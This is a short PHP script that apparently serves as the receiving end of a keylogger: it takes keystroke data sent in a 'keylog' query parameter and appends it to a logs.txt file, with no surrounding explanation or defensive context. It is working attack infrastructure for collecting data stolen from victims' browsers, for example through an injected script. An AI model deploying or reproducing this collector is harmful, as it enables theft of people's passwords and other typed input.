<?php
 
if(!empty($_GET['keylog'])) {
    $logfile = fopen('logs.txt', 'a+');
    fwrite($logfile, $_GET['keylog']);
    fclose($logfile);
}
?>